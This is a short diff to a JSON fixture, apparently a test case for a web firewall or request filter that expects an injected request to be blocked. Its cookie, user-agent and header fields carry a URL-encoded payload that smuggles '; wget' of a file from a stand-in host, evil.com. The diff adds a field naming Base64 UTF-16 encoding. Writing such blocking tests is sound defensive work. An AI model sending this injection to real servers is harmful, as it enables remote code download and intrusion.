@@ -6,7 +6,8 @@
         "COOKIE": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "USER-AGENT": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "HEADER": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
-        "BLOCKED": true
+        "ENCODE": "Base64 UTF-16",
+      "BLOCKED": true
       }
     ]
   }
